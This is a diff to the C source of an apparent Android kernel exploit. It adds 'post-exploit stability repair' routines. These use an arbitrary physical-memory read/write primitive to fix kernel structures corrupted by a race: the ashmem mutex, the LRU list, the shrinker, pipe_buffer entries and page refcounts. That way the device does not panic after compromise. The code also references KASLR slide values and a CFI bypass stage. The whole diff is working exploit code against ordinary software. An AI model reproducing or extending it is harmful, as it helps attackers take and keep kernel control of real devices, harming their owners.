@@ -101,24 +101,6 @@ static int fake_fops_owner_is_zero(int fd) {
 }
 
 #if defined(ASHMEM_MUTEX_OFF)
-/*
- * The PI chain race writes collateral data into .data objects near
- * the exploit target (ashmem_miscs).  The global ashmem_mutex sits
- * 176 bytes before ashmem_miscs[0] and is the most frequent crash
- * site: any subsequent ashmem_mmap / ashmem_ioctl dereferences the
- * corrupted wait_list and panics.
- *
- * struct mutex layout (48 bytes, from BTF):
- *   +0   owner            (atomic_long_t, 8B)
- *   +8   wait_lock        (spinlock_t,    4B)
- *   +12  osq              (optimistic_spin_queue, 4B)
- *   +16  wait_list.next   (list_head,     8B)
- *   +24  wait_list.prev   (list_head,     8B)
- *   +32  android_oem_data1                16B
- *
- * A clean unlocked mutex has owner=0, wait_lock=0, osq=0,
- * wait_list pointing to itself, and oem_data zeroed.
- */
 
 #define MUTEX_SIZE          48
 #define MUTEX_OWNER_OFF     0
@@ -129,6 +111,10 @@ static int fake_fops_owner_is_zero(int fd) {
 
 static int is_kernel_ptr(uint64_t val) {
   return (val & 0xffff000000000000ULL) == 0xffff000000000000ULL;
+}
+
+static int is_vmemmap_ptr(uint64_t val) {
+  return val >= VMEMMAP_START && val < VMEMMAP_END;
 }
 
 static int mutex_looks_corrupt(const uint8_t *buf) {
@@ -145,13 +131,47 @@ static int mutex_looks_corrupt(const uint8_t *buf) {
   return 0;
 }
 
-static void dump_hex_line(const char *label, const uint8_t *buf, size_t len) {
-  char hex[MUTEX_SIZE * 3 + 1];
+static void dump_hex(const char *label, const uint8_t *buf, size_t len) {
+  char hex[256];
   size_t pos = 0;
   for (size_t i = 0; i < len && pos + 3 < sizeof(hex); i++) {
     pos += snprintf(hex + pos, sizeof(hex) - pos, "%02x ", buf[i]);
   }
   pr_info("%s: %s\n", label, hex);
+}
+
+static void dump_page_struct(int fd, uint64_t page_addr, const char *label) {
+  if (!page_addr || !is_vmemmap_ptr(page_addr)) {
+    pr_info("diag page-struct %s addr=%016llx (not vmemmap, skip)\n",
+            label, (unsigned long long)page_addr);
+    return;
+  }
+  uint8_t raw[STRUCT_PAGE_SIZE];
+  memset(raw, 0, sizeof(raw));
+  if (!pipe_phys_read_data(fd, (uintptr_t)page_addr, raw, sizeof(raw))) {
+    pr_warning("diag page-struct %s read failed addr=%016llx\n",
+               label, (unsigned long long)page_addr);
+    return;
+  }
+  uint64_t flags, compound_head, mapping, slab_cache;
+  uint32_t page_type, refcount, mapcount;
+  memcpy(&flags, raw + 0x00, 8);
+  memcpy(&compound_head, raw + PAGE_COMPOUND_HEAD_OFF, 8);
+  memcpy(&mapping, raw + 0x10, 8);
+  memcpy(&slab_cache, raw + PAGE_SLAB_CACHE_OFF, 8);
+  memcpy(&page_type, raw + PAGE_PAGE_TYPE_OFF, 4);
+  memcpy(&refcount, raw + PAGE_PAGE_TYPE_OFF + 4, 4);
+  memcpy(&mapcount, raw + 0x28, 4);
+  pr_info("diag page-struct %s addr=%016llx flags=%016llx "
+          "compound_head=%016llx mapping=%016llx slab_cache=%016llx "
+          "page_type=%08x refcount=%d mapcount=%d\n",
+          label, (unsigned long long)page_addr,
+          (unsigned long long)flags,
+          (unsigned long long)compound_head,
+          (unsigned long long)mapping,
+          (unsigned long long)slab_cache,
+          page_type, (int32_t)refcount, (int32_t)mapcount);
+  dump_hex("diag page-struct-raw", raw, sizeof(raw));
 }
 
 static int repair_ashmem_mutex(int fd) {
@@ -167,7 +187,7 @@ static int repair_ashmem_mutex(int fd) {
     return 0;
   }
 
-  dump_hex_line("ashmem-repair mutex-before", buf, MUTEX_SIZE);
+  dump_hex("ashmem-repair mutex-before", buf, MUTEX_SIZE);
 
   if (!mutex_looks_corrupt(buf)) {
     pr_info("ashmem-repair: mutex looks clean, skipping repair\n");
@@ -199,7 +219,7 @@ static int repair_ashmem_mutex(int fd) {
     return 0;
   }
 
-  dump_hex_line("ashmem-repair mutex-after ", verify, MUTEX_SIZE);
+  dump_hex("ashmem-repair mutex-after", verify, MUTEX_SIZE);
 
   if (memcmp(clean, verify, MUTEX_SIZE) != 0) {
     pr_warning("ashmem-repair: readback mismatch\n");
@@ -242,22 +262,264 @@ static int repair_ashmem_lru_list(int fd) {
   return 1;
 }
 
+#if defined(ASHMEM_SHRINKER_OFF)
+static int check_ashmem_shrinker(int fd) {
+  uintptr_t shrinker_direct = data_addr(ASHMEM_SHRINKER);
+  uint64_t count_fn = 0, scan_fn = 0;
+
+  if (!pipe_phys_read_data(fd, shrinker_direct, &count_fn, 8) ||
+      !pipe_phys_read_data(fd, shrinker_direct + 8, &scan_fn, 8)) {
+    pr_warning("ashmem-repair: shrinker read failed\n");
+    return 0;
+  }
+
+  pr_info("ashmem-repair: shrinker count_fn=%016llx scan_fn=%016llx\n",
+          (unsigned long long)count_fn, (unsigned long long)scan_fn);
+
+  int count_ok = is_kernel_ptr(count_fn) || count_fn == 0;
+  int scan_ok = is_kernel_ptr(scan_fn) || scan_fn == 0;
+
+  if (!count_ok || !scan_ok) {
+    pr_warning("ashmem-repair: shrinker CORRUPT count_ok=%d scan_ok=%d\n",
+               count_ok, scan_ok);
+  } else {
+    pr_info("ashmem-repair: shrinker looks clean\n");
+  }
+  return count_ok && scan_ok;
+}
+#endif
+
 static int repair_ashmem_region(int fd) {
-  pr_info("ashmem-repair: starting post-exploit .data repair\n");
-  pr_info("ashmem-repair: mutex_direct=%016zx mutex_canon=%016zx\n",
+  pr_info("ashmem-repair: === .data region repair ===\n");
+  pr_info("ashmem-repair: mutex direct=%016zx canon=%016zx\n",
           data_addr(ASHMEM_MUTEX), canon_addr(ASHMEM_MUTEX));
+  pr_info("ashmem-repair: lru   direct=%016zx canon=%016zx\n",
+          data_addr(ASHMEM_LRU_LIST), canon_addr(ASHMEM_LRU_LIST));
+#if defined(ASHMEM_SHRINKER_OFF)
+  pr_info("ashmem-repair: shrnk direct=%016zx canon=%016zx\n",
+          data_addr(ASHMEM_SHRINKER), canon_addr(ASHMEM_SHRINKER));
+#endif
 
   int mutex_ok = repair_ashmem_mutex(fd);
   int lru_ok = repair_ashmem_lru_list(fd);
+#if defined(ASHMEM_SHRINKER_OFF)
+  int shrinker_ok = check_ashmem_shrinker(fd);
+#else
+  int shrinker_ok = 1;
+#endif
 
-  if (mutex_ok && lru_ok) {
-    pr_success("ashmem-repair: all repairs completed\n");
+  if (mutex_ok && lru_ok && shrinker_ok) {
+    pr_success("ashmem-repair: .data region all clean/repaired\n");
   } else {
-    pr_warning("ashmem-repair: some repairs failed mutex=%d lru=%d\n",
-               mutex_ok, lru_ok);
+    pr_warning("ashmem-repair: .data region issues mutex=%d lru=%d shrinker=%d\n",
+               mutex_ok, lru_ok, shrinker_ok);
   }
   return mutex_ok;
 }
+
+#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE && \
+    defined(P0_ORACLE_GATE_OBJECT_INDEX)
+
+static int repair_pipe_buffer_at(int fd, uintptr_t addr, const char *label,
+                                 uint64_t *out_Q) {
+  struct user_pipe_buffer buf;
+  *out_Q = 0;
+
+  pr_info("pipe-repair: --- %s at %016zx ---\n", label, addr);
+
+  if (!pipe_phys_read_data(fd, addr, &buf, sizeof(buf))) {
+    pr_warning("pipe-repair: %s read FAILED\n", label);
+    return 0;
+  }
+
+  pr_info("pipe-repair: %s BEFORE page=%016llx ops=%016llx "
+          "offset=%u len=%u flags=%u private=%016llx\n",
+          label,
+          (unsigned long long)buf.page, (unsigned long long)buf.ops,
+          buf.offset, buf.len, buf.flags,
+          (unsigned long long)buf.private);
+
+  int page_is_vmemmap = is_vmemmap_ptr(buf.page);
+  int ops_is_valid = buf.ops == pipe_buf_ops_addr();
+  int looks_corrupt = page_is_vmemmap && ops_is_valid;
+
+  pr_info("pipe-repair: %s analysis page_vmemmap=%d ops_valid=%d "
+          "expected_ops=%016zx corrupt=%d\n",
+          label, page_is_vmemmap, ops_is_valid,
+          pipe_buf_ops_addr(), looks_corrupt);
+
+  if (!looks_corrupt) {
+    int page_is_zero = (buf.page == 0);
+    int ops_is_zero = (buf.ops == 0);
+    pr_info("pipe-repair: %s page_zero=%d ops_zero=%d — %s\n",
+            label, page_is_zero, ops_is_zero,
+            (page_is_zero && ops_is_zero) ? "already zeroed (clean)" :
+            (!page_is_vmemmap && !page_is_zero) ? "page not vmemmap — unexpected" :
+            "no repair needed");
+    if (page_is_vmemmap) {
+      *out_Q = buf.page & ~1ULL;
+      dump_page_struct(fd, *out_Q, label);
+    }
+    return 1;
+  }
+
+  *out_Q = buf.page & ~1ULL;
+
+  pr_info("pipe-repair: %s CORRUPTED — page points to vmemmap Q=%016llx "
+          "with valid ops (put_page would fire on close)\n",
+          label, (unsigned long long)*out_Q);
+
+  dump_page_struct(fd, *out_Q, label);
+
+  struct user_pipe_buffer zeroed;
+  memset(&zeroed, 0, sizeof(zeroed));
+  if (!pipe_phys_write_data(fd, addr, &zeroed, sizeof(zeroed))) {
+    pr_warning("pipe-repair: %s zero write FAILED\n", label);
+    return 0;
+  }
+
+  struct user_pipe_buffer verify;
+  if (!pipe_phys_read_data(fd, addr, &verify, sizeof(verify))) {
+    pr_warning("pipe-repair: %s readback FAILED\n", label);
+    return 0;
+  }
+
+  int verify_ok = (verify.page == 0 && verify.ops == 0 &&
+                   verify.len == 0 && verify.flags == 0);
+  pr_info("pipe-repair: %s AFTER page=%016llx ops=%016llx "
+          "offset=%u len=%u flags=%u verify=%s\n",
+          label,
+          (unsigned long long)verify.page, (unsigned long long)verify.ops,
+          verify.offset, verify.len, verify.flags,
+          verify_ok ? "OK" : "MISMATCH");
+
+  if (verify_ok) {
+    pr_success("pipe-repair: %s zeroed — put_page(Q) PREVENTED\n", label);
+  }
+  return verify_ok;
+}
+
+static int compensate_refcount(int fd, uint64_t Q, const char *label) {
+  if (Q == 0) {
+    pr_info("pipe-repair: %s refcount skip (Q=0)\n", label);
+    return 1;
+  }
+
+  uintptr_t head = (uintptr_t)Q;
+  uint64_t compound_head = 0;
+  if (pipe_phys_read_data(fd, head + STRUCT_PAGE_COMPOUND_HEAD_OFF,
+                          &compound_head, sizeof(compound_head)) &&
+      (compound_head & 1)) {
+    head = (uintptr_t)(compound_head & ~1ULL);
+    pr_info("pipe-repair: %s Q=%016llx is tail, head=%016zx\n",
+            label, (unsigned long long)Q, head);
+  }
+
+  uintptr_t rc_addr = head + PAGE_PAGE_TYPE_OFF + 4;
+  uint32_t refcount = 0;
+  if (!pipe_phys_read_data(fd, rc_addr, &refcount, sizeof(refcount))) {
+    pr_warning("pipe-repair: %s refcount read FAILED at %016zx\n",
+               label, rc_addr);
+    return 0;
+  }
+
+  pr_info("pipe-repair: %s Q head=%016zx refcount_addr=%016zx "
+          "current_refcount=%d\n",
+          label, head, rc_addr, (int32_t)refcount);
+
+  uint32_t new_rc = refcount + 1;
+  if (!pipe_phys_write_data(fd, rc_addr, &new_rc, sizeof(new_rc))) {
+    pr_warning("pipe-repair: %s refcount write FAILED\n", label);
+    return 0;
+  }
+
+  uint32_t verify_rc = 0;
+  pipe_phys_read_data(fd, rc_addr, &verify_rc, sizeof(verify_rc));
+
+  pr_info("pipe-repair: %s refcount %d -> %d (verify=%d) %s\n",
+          label, (int32_t)refcount, (int32_t)new_rc, (int32_t)verify_rc,
+          verify_rc == new_rc ? "OK" : "MISMATCH");
+
+  if (verify_rc == new_rc) {
+    pr_success("pipe-repair: %s refcount compensated — "
+               "gate_holder put_page(Q) will be balanced\n", label);
+  }
+  return verify_rc == new_rc;
+}
+
+static void repair_p0_pipe_corruption(int fd) {
+  pr_info("pipe-repair: === P0 oracle pipe_buffer corruption repair ===\n");
+  pr_info("pipe-repair: pipebuf_page_base=%016zx PIPE_OBJECT_SIZE=0x%x "
+          "GATE_OBJECT_INDEX=%d\n",
+          pipebuf_page_base, PIPE_OBJECT_SIZE, P0_ORACLE_GATE_OBJECT_INDEX);
+  pr_info("pipe-repair: PIPE_BUFFER_SLOTS=%d sizeof(pipe_buffer)=0x%zx "
+          "pipe_bufs_size=0x%zx\n",
+          PIPE_BUFFER_SLOTS, sizeof(struct user_pipe_buffer),
+          (size_t)PIPE_BUFFER_SLOTS * sizeof(struct user_pipe_buffer));
+  pr_info("pipe-repair: anon_pipe_buf_ops=%016zx\n", pipe_buf_ops_addr());
+  pr_info("pipe-repair: p0_gate_page_struct=%016zx "
+          "p0_probe_page_struct=%016zx\n",
+          p0_gate_page_struct, p0_probe_page_struct);
+
+  uintptr_t gate_entry = pipebuf_page_base +
+      P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE;
+  uintptr_t probe_entry = gate_entry + sizeof(struct user_pipe_buffer);
+
+  pr_info("pipe-repair: gate_entry=%016zx probe_entry=%016zx\n",
+          gate_entry, probe_entry);
+
+  uint64_t gate_Q = 0, probe_Q = 0;
+  int gate_ok = repair_pipe_buffer_at(fd, gate_entry, "gate", &gate_Q);
+  int probe_ok = repair_pipe_buffer_at(fd, probe_entry, "probe", &probe_Q);
+
+  pr_info("pipe-repair: gate_Q=%016llx probe_Q=%016llx same=%d\n",
+          (unsigned long long)gate_Q, (unsigned long long)probe_Q,
+          gate_Q == probe_Q);
+
+  int gate_rc = 1, probe_rc = 1;
+  if (gate_Q != 0) {
+    gate_rc = compensate_refcount(fd, gate_Q, "gate");
+  }
+  if (probe_Q != 0 && probe_Q != gate_Q) {
+    probe_rc = compensate_refcount(fd, probe_Q, "probe");
+  } else if (probe_Q == gate_Q && probe_Q != 0) {
+    pr_info("pipe-repair: probe Q same as gate Q, compensating once more\n");
+    probe_rc = compensate_refcount(fd, probe_Q, "probe-same-Q");
+  }
+
+  pr_info("pipe-repair: === summary: gate=%d/%d probe=%d/%d ===\n",
+          gate_ok, gate_rc, probe_ok, probe_rc);
+  if (gate_ok && probe_ok && gate_rc && probe_rc) {
+    pr_success("pipe-repair: all pipe_buffer repairs completed\n");
+  } else {
+    pr_warning("pipe-repair: PARTIAL — gate_buf=%d gate_rc=%d "
+               "probe_buf=%d probe_rc=%d\n",
+               gate_ok, gate_rc, probe_ok, probe_rc);
+  }
+}
+#endif
+
+static void run_post_exploit_repair(int fd) {
+  pr_info("post-repair: ========================================\n");
+  pr_info("post-repair: POST-EXPLOIT STABILITY REPAIR\n");
+  pr_info("post-repair: ========================================\n");
+  pr_info("post-repair: kaslr_base=%016llx slide=%016llx\n",
+          (unsigned long long)kaslr_base, (unsigned long long)kaslr_slide);
+  pr_info("post-repair: page_base=%016zx pipebuf_page_base=%016zx\n",
+          page_base, pipebuf_page_base);
+
+  repair_ashmem_region(fd);
+
+#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE && \
+    defined(P0_ORACLE_GATE_OBJECT_INDEX)
+  repair_p0_pipe_corruption(fd);
+#endif
+
+  pr_info("post-repair: ========================================\n");
+  pr_info("post-repair: REPAIR COMPLETE\n");
+  pr_info("post-repair: ========================================\n");
+}
+
 #endif
 
 #if !defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE
@@ -714,7 +976,7 @@ int try_cfi_stage(void) {
   }
 
 #if defined(ASHMEM_MUTEX_OFF)
-  repair_ashmem_region(fd);
+  run_post_exploit_repair(fd);
 #endif
 
   uint64_t after = 0;
